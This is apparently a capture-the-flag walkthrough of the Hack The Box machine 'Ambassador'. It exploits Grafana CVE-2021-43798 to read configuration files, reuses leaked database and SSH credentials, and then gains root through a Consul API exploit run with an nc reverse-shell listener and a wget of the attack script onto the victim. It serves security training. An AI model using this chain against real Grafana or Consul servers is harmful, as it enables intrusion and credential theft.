
Add `ambassador.htb` to `/etc/hosts`
```bash
echo "10.10.11.183	ambassador.htb" | sudo tee -a /etc/hosts
```

Initial enumeration consisted of firing up `autorcon`
```bash
sudo (which autorecon) ambassador.htb
```
- It will not inform you of the desired port `3000` on the initial terminal output. You can go to:
	- `/results/ambassador.htb/scans/`
```bash
cat _full_tcp_nmap.txt | grep open                                                                                                                                                            

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
3000/tcp open  ppp?    syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63 MySQL 8.0.30-0ubuntu0.20.04.2
```
- Manual enumeration of `http://ambassdor:80` didn't offer much with the exception of the default username of `developer`.
- running `nc ambassador.htb 3306` verified `mysql` was running, but without proper credentials it will output an error message.
- At `http://ambassador.htb:3000/` a login page can be found:
- [[http://ambassador.htb:3000/login]]
- Despite `Grafana` not having any password rate limiters this will not be the route in.
- Fortunately, the `Grafana` app has some convenient information disclosure of the version at the bottom right.
```bash
v8.2.0
```

GoogleFu:
- `grafana v8.2.0 exploit`
- This will lead you to:
	- [[https://www.exploit-db.com/exploits/50581]]
- I was more interested in the `CVE` name:
	- `CVE-2021-43798`

GoogleFu:
- `CVE-2021-43798 git`
- This will lead you to this convenient github repository:
	- [[https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798]]
- Run:
```bash
git clone https://github.com/pedrohavay/exploit-grafana-CVE-2021-43798.git
cd exploit-grafana-CVE-2021-43798
python3.9 -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt
echo "http://ambassador.htb:3000" > targets.txt
python3 exploit.py
targets.txt
```

![[Pasted image 20230119202035.png]]

- Keep in mind if you happen to be on a fresh virtual machine with an up-to-date Kali instance you will find out there will be comparability issues. On top of that I had numerous issues spinning up a docker instance to emulate a `python3.9` instance because it isn't natively installed. You've been forewarned.
- After running the exploit you will have a new directory named:
- `http_ambassador_htb_300` or something similar.
	- The file structure will look like:
```bash
cmdline*  defaults.ini*  grafana.db*  grafana.ini*  passwd*
```
- Note you will be able to verify there is in fact a user named `developer` in the `passwd` or `/etc/passwd` file.

- In `grafana.ini` you can find login credentials to the site. There isn't much to go off of besides some sort of `*.json` upload functionality that doesn't seem to be much of a help.
```bash
bat grafana.ini

 211   │ #################################### Security ####################################
 212   │ [security]
 213   │ # disable creation of admin user on first start of grafana
 214   │ ;disable_initial_admin_creation = false
 215   │ 
 216   │ # default admin user, created on startup
 217   │ ;admin_user = admin
 218   │ 
 219   │ # default admin password, can be changed before first start of grafana,  or in profile settings
 220   │ admin_password = messageInABottle685427
 221   │ 
 222   │ # used for signing
 223   │ ;secret_key = SW2YcwTIb9zpOOhoPsMm

```

- In the `grafana.db` you can find some additional credentials.
```bash
sqlite3 grafana.db

SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> select * from data_source;
2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-19 05:50:48|0|{}|1|uKewFgM4z
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230119224023.png)

- We can then utilize the `mysql` instance on port `3306`.
- In order to sign in:
```bash
mysql -u grafana --password -h ambassador.htb -P 3306
Enter password: dontStandSoCloseToMe63221!
```

- Show the databases available.
```bash
show databases;

+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
```

- Select a specific database then show the tables that are within said database.
```bash
use whackywidget
show tables;

+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
```

- Select all from the `users` table.
```bash
select * from users;

+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

- Decode the `base64` hash which can be identified by the two `==` at the end of the hash.
```bash
echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
anEnglishManInNewYork027468
```

- We got a new password! Let's give it a go and `ssh` into the server as `developer` and see if it works.
```bash
ssh developer@ambassador.htb  
Password: anEnglishManInNewYork027468
```

- It does! We're in. We can see the user flag which we can grab right away.
```bash
cat user.txt 
7a66916c1c5853a796dc6434ec0fcfdb
```

- We can also see `.gitconfig` if we run `ls -lat`
```bash
cat .gitconfig

[user]
	name = Developer
	email = developer@ambassador.local
[safe]
	directory = /opt/my-app
```

- After some manual enumeration we run `linpeas.sh`  to get a better landscape of the server.
- There isn't much to go off of with the exception of the previously discovered `/opt/my-app`.

![image](https://0xc0rvu5.github.io/docs/assets/images/20230119225104.png)

Let's check it out.
- We can see some commit messages.
- We can go into the `/root` directory of `my-app` at `/opt/my-app` and check it out.
```bash
git log
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230119225327.png)

- Right off the bat we find some secrets.
```bash
git show 33a53ef9a207976d5ceceddc41a199558843bf3c

-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230119225452.png)

GoogleFu:
- `consul exploit`
- We can see there may be some sort of RCE via the `Services API`.
	- `Hashicorp Consul Remote Command Execution via Services API`
	- There is a `metasploit` module here:
		- [[https://www.rapid7.com/db/modules/exploit/multi/misc/consul_service_exec/]]

GoogleFu:
- `consul RCE git`
- We find a convenient `python` script.
	- [[https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API]]
- Let's test it out.
- On Host:
```bash
cd ~/Downloads/temp
wget https://raw.githubusercontent.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API/main/exploit.py
mv exploit.py consul.py
python -m http.server
```
- On Victim (as developer):
```bash
wget http://10.10.16.34:8000/consul.py
chmod 700 consul.py
```
- On host:
```bash
On host:
nc -lvnp 4444
```
- On Victim (as developer):
```bash
python3 consul.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.16.34 --lport 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
```
- It informs us to check back on our host machine.
- Voila! Rooted!
```bash
cat /home/developer/user.txt

7a66916c1c5853a796dc6434ec0fcfdb

cat root.txt

4c10afa99c9067de2878f7f38ecd7dfa
```

![image](https://0xc0rvu5.github.io/docs/assets/images/20230119230345.png)

#hacking
